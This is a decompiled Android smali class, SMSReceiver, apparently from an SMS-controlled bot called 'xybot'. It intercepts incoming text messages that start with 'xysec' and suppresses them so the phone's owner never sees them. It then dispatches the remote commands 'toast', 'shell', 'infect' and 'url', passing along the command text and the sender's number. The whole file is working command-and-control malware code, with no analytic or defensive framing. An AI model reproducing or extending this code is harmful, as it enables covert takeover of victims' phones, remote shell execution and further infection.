.class public Lcom/xybot/SMSReceiver;
.super Landroid/content/BroadcastReceiver;
.source "SMSReceiver.java"


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 13
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 16
    .parameter "context"
    .parameter "intent"

    .prologue
    .line 19
    invoke-virtual/range {p2 .. p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v12

    const-string v13, "android.provider.Telephony.SMS_RECEIVED"

    invoke-virtual {v12, v13}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-nez v12, :cond_1

    .line 128
    :cond_0
    return-void

    .line 23
    :cond_1
    invoke-virtual/range {p2 .. p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v1

    .line 24
    .local v1, bundle:Landroid/os/Bundle;
    if-eqz v1, :cond_0

    .line 26
    const-string v12, "pdus"

    invoke-virtual {v1, v12}, Landroid/os/Bundle;->get(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v11

    check-cast v11, [Ljava/lang/Object;

    .line 27
    .local v11, pdusObj:[Ljava/lang/Object;
    array-length v12, v11

    new-array v7, v12, [Landroid/telephony/SmsMessage;

    .line 30
    .local v7, messages:[Landroid/telephony/SmsMessage;
    const/4 v3, 0x0

    .local v3, i:I
    :goto_0
    array-length v12, v11

    if-lt v3, v12, :cond_3

    .line 34
    array-length v13, v7

    const/4 v12, 0x0

    .end local v3           #i:I
    :goto_1
    if-ge v12, v13, :cond_0

    aget-object v2, v7, v12

    .line 37
    .local v2, currentMessage:Landroid/telephony/SmsMessage;
    invoke-virtual {v2}, Landroid/telephony/SmsMessage;->getDisplayMessageBody()Ljava/lang/String;

    move-result-object v6

    .line 38
    .local v6, message:Ljava/lang/String;
    invoke-virtual {v2}, Landroid/telephony/SmsMessage;->getDisplayOriginatingAddress()Ljava/lang/String;

    move-result-object v10

    .line 39
    .local v10, num:Ljava/lang/String;
    const-string v14, "mesage"

    invoke-static {v14, v6}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 41
    if-eqz v6, :cond_2

    invoke-virtual {v6}, Ljava/lang/String;->length()I

    move-result v14

    if-lez v14, :cond_2

    .line 44
    invoke-virtual {v6}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v14

    const-string v15, "xysec"

    invoke-virtual {v14, v15}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v14

    if-eqz v14, :cond_2

    .line 46
    const-string v14, "message1"

    invoke-static {v14, v6}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 50
    invoke-virtual/range {p0 .. p0}, Lcom/xybot/SMSReceiver;->abortBroadcast()V

    .line 52
    invoke-virtual {v6}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v14}, Ljava/lang/String;->length()I

    move-result v14

    const/4 v15, 0x5

    if-gt v14, v15, :cond_4

    .line 53
    const-string v14, "No operator"

    invoke-static {v14, v6}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 34
    :cond_2
    :goto_2
    add-int/lit8 v12, v12, 0x1

    goto :goto_1

    .line 31
    .end local v2           #currentMessage:Landroid/telephony/SmsMessage;
    .end local v6           #message:Ljava/lang/String;
    .end local v10           #num:Ljava/lang/String;
    .restart local v3       #i:I
    :cond_3
    aget-object v12, v11, v3

    check-cast v12, [B

    invoke-static {v12}, Landroid/telephony/SmsMessage;->createFromPdu([B)Landroid/telephony/SmsMessage;

    move-result-object v12

    aput-object v12, v7, v3

    .line 30
    add-int/lit8 v3, v3, 0x1

    goto :goto_0

    .line 58
    .end local v3           #i:I
    .restart local v2       #currentMessage:Landroid/telephony/SmsMessage;
    .restart local v6       #message:Ljava/lang/String;
    .restart local v10       #num:Ljava/lang/String;
    :cond_4
    const-string v14, " "

    invoke-virtual {v6, v14}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v14

    const/4 v15, 0x1

    aget-object v14, v14, v15

    invoke-virtual {v14}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v14

    const-string v15, "toast"

    invoke-virtual {v14, v15}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v14

    if-eqz v14, :cond_5

    .line 61
    const-string v14, " "

    const/4 v15, 0x6

    invoke-virtual {v6, v14, v15}, Ljava/lang/String;->indexOf(Ljava/lang/String;I)I

    move-result v14

    invoke-virtual {v6, v14}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v14}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v8

    .line 63
    .local v8, mssg:Ljava/lang/String;
    const-string v14, "splitmsg"

    invoke-static {v14, v8}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 66
    new-instance v9, Landroid/content/Intent;

    const-class v14, Lcom/xybot/toastmaker;

    move-object/from16 v0, p1

    invoke-direct {v9, v0, v14}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 67
    .local v9, myIntent:Landroid/content/Intent;
    const-string v14, "msg"

    invoke-virtual {v9, v14, v8}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 68
    move-object/from16 v0, p1

    invoke-virtual {v0, v9}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    goto :goto_2

    .line 73
    .end local v8           #mssg:Ljava/lang/String;
    .end local v9           #myIntent:Landroid/content/Intent;
    :cond_5
    const-string v14, " "

    invoke-virtual {v6, v14}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v14

    const/4 v15, 0x1

    aget-object v14, v14, v15

    invoke-virtual {v14}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v14

    const-string v15, "shell"

    invoke-virtual {v14, v15}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v14

    if-eqz v14, :cond_6

    .line 76
    const-string v14, " "

    const/4 v15, 0x6

    invoke-virtual {v6, v14, v15}, Ljava/lang/String;->indexOf(Ljava/lang/String;I)I

    move-result v14

    invoke-virtual {v6, v14}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v14}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v8

    .line 78
    .restart local v8       #mssg:Ljava/lang/String;
    const-string v14, "shell"

    invoke-static {v14, v8}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 81
    new-instance v3, Landroid/content/Intent;

    const-class v14, Lcom/xybot/xyshell;

    move-object/from16 v0, p1

    invoke-direct {v3, v0, v14}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 82
    .local v3, i:Landroid/content/Intent;
    const/high16 v14, 0x1000

    invoke-virtual {v3, v14}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 83
    const-string v14, "shell"

    invoke-virtual {v3, v14, v8}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 84
    const-string v14, "num"

    invoke-virtual {v3, v14, v10}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 85
    move-object/from16 v0, p1

    invoke-virtual {v0, v3}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    goto/16 :goto_2

    .line 91
    .end local v3           #i:Landroid/content/Intent;
    .end local v8           #mssg:Ljava/lang/String;
    :cond_6
    const-string v14, " "

    invoke-virtual {v6, v14}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v14

    const/4 v15, 0x1

    aget-object v14, v14, v15

    invoke-virtual {v14}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v14

    const-string v15, "infect"

    invoke-virtual {v14, v15}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v14

    if-eqz v14, :cond_7

    .line 94
    const-string v14, " "

    const/4 v15, 0x6

    invoke-virtual {v6, v14, v15}, Ljava/lang/String;->indexOf(Ljava/lang/String;I)I

    move-result v14

    invoke-virtual {v6, v14}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v14}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v8

    .line 96
    .restart local v8       #mssg:Ljava/lang/String;
    const-string v14, "inf"

    invoke-static {v14, v8}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 99
    new-instance v4, Landroid/content/Intent;

    const-class v14, Lcom/xybot/infect;

    move-object/from16 v0, p1

    invoke-direct {v4, v0, v14}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 100
    .local v4, ij:Landroid/content/Intent;
    const/high16 v14, 0x1000

    invoke-virtual {v4, v14}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 101
    const-string v14, "inf"

    invoke-virtual {v4, v14, v8}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 102
    move-object/from16 v0, p1

    invoke-virtual {v0, v4}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    goto/16 :goto_2

    .line 108
    .end local v4           #ij:Landroid/content/Intent;
    .end local v8           #mssg:Ljava/lang/String;
    :cond_7
    const-string v14, " "

    invoke-virtual {v6, v14}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v14

    const/4 v15, 0x1

    aget-object v14, v14, v15

    invoke-virtual {v14}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v14

    const-string v15, "url"

    invoke-virtual {v14, v15}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v14

    if-eqz v14, :cond_2

    .line 111
    const-string v14, " "

    const/4 v15, 0x6

    invoke-virtual {v6, v14, v15}, Ljava/lang/String;->indexOf(Ljava/lang/String;I)I

    move-result v14

    invoke-virtual {v6, v14}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v14}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v8

    .line 113
    .restart local v8       #mssg:Ljava/lang/String;
    const-string v14, "url"

    invoke-static {v14, v8}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 116
    new-instance v5, Landroid/content/Intent;

    const-class v14, Lcom/xybot/browse;

    move-object/from16 v0, p1

    invoke-direct {v5, v0, v14}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 117
    .local v5, ijk:Landroid/content/Intent;
    const/high16 v14, 0x1000

    invoke-virtual {v5, v14}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 118
    const-string v14, "url"

    invoke-virtual {v5, v14, v8}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 119
    move-object/from16 v0, p1

    invoke-virtual {v0, v5}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    goto/16 :goto_2
.end method
